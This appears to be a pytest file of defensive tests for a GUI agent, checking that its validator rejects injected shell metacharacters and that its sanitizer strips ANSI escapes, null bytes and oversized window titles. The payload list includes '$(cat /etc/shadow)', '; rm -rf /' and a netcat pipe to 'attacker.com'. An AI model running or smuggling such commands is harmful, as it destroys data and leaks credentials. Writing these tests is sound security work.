"""Adversarial tests for GUI Agent — metacharacter injection, ANSI in titles."""

from __future__ import annotations

import pytest

from gui_agent.atspi import _sanitize_gui_string
from gui_agent.protocol import validate_gui_params


class TestMetacharInSelectors:
    @pytest.mark.parametrize("field", ["window", "role", "name"])
    @pytest.mark.parametrize("payload", [
        "$(cat /etc/shadow)",
        "; rm -rf /",
        "| nc attacker.com 4444",
        "`whoami`",
        "foo\x00bar",
    ])
    def test_metachar_rejected_in_all_selector_fields(self, field, payload):
        params = {"window": "safe", "role": "button", "name": "OK"}
        params[field] = payload
        with pytest.raises(Exception):
            validate_gui_params("gui.click", params)


class TestAnsiInWindowTitles:
    def test_ansi_escape_stripped(self):
        title = "\x1b[31;1mMalicious Title\x1b[0m"
        clean = _sanitize_gui_string(title)
        assert "\x1b" not in clean
        assert "Malicious Title" in clean

    def test_carriage_return_neutralized(self):
        title = "Normal\r\x1b[AOverwrite"
        clean = _sanitize_gui_string(title)
        assert "\r" not in clean
        assert "\x1b" not in clean

    def test_null_byte_stripped(self):
        title = "Window\x00Title"
        clean = _sanitize_gui_string(title)
        assert "\x00" not in clean
        assert "WindowTitle" in clean


class TestOversizedInput:
    def test_long_string_truncated(self):
        long_name = "A" * 1000
        clean = _sanitize_gui_string(long_name)
        assert len(clean) <= 260
        assert clean.endswith("...")

    def test_long_window_name_rejected_by_schema(self):
        long_window = "A" * 300
        with pytest.raises(Exception):
            validate_gui_params("gui.find_element", {
                "window": long_window,
                "role": "button",
                "name": "OK",
            })
